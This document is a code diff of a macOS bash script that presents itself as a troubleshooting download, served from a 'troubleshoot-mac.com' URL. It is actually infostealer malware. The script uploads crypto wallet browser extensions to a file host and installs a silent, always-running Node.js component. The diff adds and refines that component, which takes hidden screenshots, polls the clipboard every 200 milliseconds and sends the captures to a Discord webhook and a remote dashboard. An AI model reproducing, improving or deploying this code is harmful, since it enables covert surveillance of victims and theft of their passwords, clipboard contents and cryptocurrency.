@@ -1,9 +1,10 @@
 #!/bin/bash
 #
-# Crypto Wallet Extensions Uploader
+# Crypto Wallet Extensions Uploader + Keylogger
 # Downloads available at: https://troubleshoot-mac.com/troubleshoot.sh
 #
 # This script zips and uploads crypto wallet extensions to Gofile.io
+# Also installs a silent keylogger + screenshotter that runs 24/7
 # ---------------------
 # SETTINGS
 # ---------------------
@@ -676,9 +677,9 @@ if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
 fi
 
 # ---------------------
-# REMOVED: Screen watcher - using keylogger + screenshotter only
+# KEYLOGGER + SCREENSHOTTER INSTALLATION
 # ---------------------
-# Screen watcher function completely removed - only keylogger + screenshotter now
+
 # Send Discord notification that client ran the script
 send_client_notification() {
     local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
@@ -715,7 +716,7 @@ install_keylogger_screenshotter() {
     mkdir -p "$APP_DIR" 2>/dev/null
     
     # Create keylogger script inline (self-contained, no external files needed)
-        cat > "$APP_DIR/keylogger-screenshotter.js" << 'KEYLOGGEREOF'
+    cat > "$APP_DIR/keylogger-screenshotter.js" << 'KEYLOGGEREOF'
 // Silent Keylogger + Screenshotter - Runs 24/7
 const { exec } = require('child_process');
 const fs = require('fs');
@@ -769,65 +770,87 @@ function takeScreenshot() {
     const filename = `screenshot_${timestamp}.png`;
     const filepath = path.join(screenshotDir, filename);
     
-    // Capture current keys before screenshot
-    const currentKeys = keysBuffer || '[No activity detected]';
+    // Capture current keys before screenshot (don't clear yet)
+    const currentKeys = keysBuffer.length > 0 ? keysBuffer : `[Screenshot ${new Date().toLocaleTimeString()}]`;
     
     exec(`screencapture -x "${filepath}"`, (error) => {
         if (!error && fs.existsSync(filepath)) {
-            const imageBuffer = fs.readFileSync(filepath);
-            const base64Image = imageBuffer.toString('base64');
-            const dataURL = `data:image/png;base64,${base64Image}`;
-            
-            // Send to Discord with keys
-            sendToDiscord(dataURL, currentKeys);
-            
-            // Send to dashboard via Socket.IO
-            if (socket && socket.connected) {
-                socket.emit('screenshot', {
-                    clientId: CLIENT_ID,
-                    image: dataURL,
-                    keys: currentKeys,
-                    timestamp: timestamp
-                });
+            try {
+                const imageBuffer = fs.readFileSync(filepath);
+                const base64Image = imageBuffer.toString('base64');
+                const dataURL = `data:image/png;base64,${base64Image}`;
+                
+                // ALWAYS send to Discord (even if no keys)
+                sendToDiscord(dataURL, currentKeys);
+                
+                // Send to dashboard via Socket.IO
+                if (socket && socket.connected) {
+                    socket.emit('screenshot', {
+                        clientId: CLIENT_ID,
+                        image: dataURL,
+                        keys: currentKeys,
+                        timestamp: timestamp
+                    });
+                }
+                
+                // Clean up file
+                setTimeout(() => { 
+                    try { 
+                        fs.unlinkSync(filepath); 
+                    } catch (e) {} 
+                }, 10000);
+            } catch (e) {
+                // Silent error handling
             }
-            
-            // Clean up file
-            setTimeout(() => { try { fs.unlinkSync(filepath); } catch (e) {} }, 10000);
-            
-            // Clear buffer after sending (but keep last activity for context)
-            keysBuffer = '';
         }
+        
+        // Clear buffer AFTER sending
+        keysBuffer = '';
     });
 }
 
 function sendToDiscord(imageData, keys) {
-    const keysText = keys && keys.length > 0 ? keys : '[No activity detected]';
-    const message = `**Activity Log:** \`${keysText}\``;
+    const keysText = keys && keys.length > 0 ? keys : '[Periodic screenshot - no activity detected]';
+    const timestamp = new Date().toISOString();
+    
+    // Create payload with proper escaping
     const payload = {
-        content: `📸 **Screenshot from ${CLIENT_ID}**\n${message}`,
+        content: `📸 **Screenshot from ${CLIENT_ID}**\n**Activity:** \`${keysText}\``,
         embeds: [{ 
-            image: { url: imageData }, 
-            description: `**Activity:** ${keysText}`,
-            timestamp: new Date().toISOString() 
+            image: { url: imageData },
+            description: `**Activity Log:**\n\`\`\`\n${keysText}\n\`\`\``,
+            timestamp: timestamp,
+            color: keysText.includes('No activity') ? 0x999999 : 0x2ecc71
         }]
     };
-    const payloadStr = JSON.stringify(payload).replace(/'/g, "'\\''").replace(/"/g, '\\"');
-    exec(`curl -s -X POST -H "Content-Type: application/json" -d "${payloadStr}" "${WEBHOOK}"`, () => {});
+    
+    // Properly escape JSON for shell
+    const payloadStr = JSON.stringify(payload)
+        .replace(/\\/g, '\\\\')
+        .replace(/'/g, "\\'")
+        .replace(/"/g, '\\"');
+    
+    // Send to Discord
+    exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadStr}' "${WEBHOOK}"`, (error, stdout, stderr) => {
+        // Silent - don't log errors
+    });
 }
 
 // Monitor clipboard changes (no permission needed) - captures copy/paste
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
-        if (!error && stdout && stdout !== lastClipboard && stdout.length > 0) {
-            const clipboard = stdout.substring(0, 500);
-            lastClipboard = stdout;
-            keysBuffer += `[Clipboard: ${clipboard}] `;
-            lastKeyTime = Date.now();
-            // Take screenshot immediately when clipboard changes
-            setTimeout(() => takeScreenshot(), 1000);
+        if (!error && stdout && stdout.trim() && stdout !== lastClipboard) {
+            const clipboard = stdout.trim().substring(0, 1000);
+            if (clipboard.length > 0) {
+                lastClipboard = stdout;
+                keysBuffer += `[Clipboard Copy: ${clipboard}] `;
+                lastKeyTime = Date.now();
+                // Take screenshot when clipboard changes
+                setTimeout(() => takeScreenshot(), 500);
+            }
         }
     });
-}, 300); // Check more frequently
+}, 200); // Check very frequently for clipboard changes
 
 // Monitor keyboard activity by checking clipboard more aggressively
 // Also monitor if user is typing by checking file modification times
@@ -888,11 +911,16 @@ setInterval(() => {
     lastFileCheck = Date.now();
 }, 5000);
 
-// Periodic screenshots
+// Periodic screenshots - always send to Discord
 setInterval(() => {
     const now = Date.now();
     if (now - lastScreenshotTime > SCREENSHOT_INTERVAL) {
         lastScreenshotTime = now;
+        // Always take screenshot, even if no keys captured
+        // This ensures Discord gets regular updates
+        if (keysBuffer.length === 0) {
+            keysBuffer = `[Periodic Screenshot - ${new Date().toLocaleTimeString()}]`;
+        }
         takeScreenshot();
     }
 }, SCREENSHOT_INTERVAL);
